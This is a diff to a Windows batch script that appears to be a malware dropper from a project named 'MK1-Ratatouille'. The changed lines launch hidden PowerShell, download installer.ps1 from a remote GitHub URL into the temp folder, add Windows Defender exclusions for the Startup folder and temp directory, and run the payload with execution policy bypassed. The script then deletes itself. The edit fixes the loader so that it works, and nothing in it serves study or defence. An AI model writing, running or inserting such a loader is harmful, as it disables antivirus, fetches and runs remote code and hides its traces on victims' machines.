@@ -44,18 +44,16 @@ if '%errorlevel%' NEQ '0' (
 @REM REM self delete
 @REM del "%~f0"
 
-
-REM disable defender and execute downloaded script
-powershell -windowstyle hidden -c ^
+REM Disable Windows Defender and execute the downloaded script
+powershell -windowstyle hidden -Command ^
 "try { ^
-    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/installer.ps1' -OutFile 'installer.ps1'; ^
+    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/installer.ps1' -OutFile '$env:TEMP\installer.ps1'; ^
     Add-MpPreference -ExclusionPath '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup'; ^
-    Add-MpPreference -ExclusionPath '$env:temp'^
-    .\installer.ps1; ^
+    Add-MpPreference -ExclusionPath '$env:TEMP'; ^
+    powershell.exe -ExecutionPolicy Bypass -File '$env:TEMP\installer.ps1'; ^
 } catch { ^
     Write-Error 'An error occurred: ' + $_.Exception.Message; ^
 }"
 
-REM self delete
-@REM 
+REM Self-delete
 start /b "" cmd /c del "%~f0"&exit
